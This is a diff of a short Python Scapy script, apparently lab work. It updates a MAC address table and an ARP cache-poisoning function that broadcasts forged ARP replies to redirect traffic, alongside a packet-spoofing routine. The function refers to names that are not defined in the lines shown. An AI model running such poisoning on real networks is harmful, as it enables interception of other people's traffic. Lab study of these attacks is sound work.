@@ -2,7 +2,7 @@
 
 from scapy.all import *
 
-macaddr  = {"10.9.0.1" : "02:42:7b:ab:dd:89", "10.0.2.5" : "08:00:27:86:d6:05"}
+macaddr  = {"10.9.0.1":"02:42:7b:ab:dd:89", "10.0.2.5":"08:00:27:86:d6:05", "10.9.0.5":"02:42:0a:09:00:05"}
 
 def spoof(pkt):
     dst = pkt[1].dst
@@ -14,8 +14,8 @@ def spoof(pkt):
     send(reply)
 
 def arp_pois(pkt):
-    reply = ARP(op=ARP.is_at, hwsrc = macaddr["10.0.2.5"], psrc=packet.pdst, hwdst = "ff:ff:ff:ff:ff:ff", pdst=broadcastNet)
-    go = Ether(dst="ff:ff:ff:ff:ff:ff", src = macaddr["10.0.2.5"]) / reply
+    reply = ARP(op=ARP.is_at, hwsrc = macaddr["10.9.0.5"], psrc=packet.pdst, hwdst = "ff:ff:ff:ff:ff:ff", pdst=broadcastNet)
+    go = Ether(dst="ff:ff:ff:ff:ff:ff", src = macaddr["10.9.0.5"]) / reply
     sendp(go)
 
 def print_pkt(pkt):
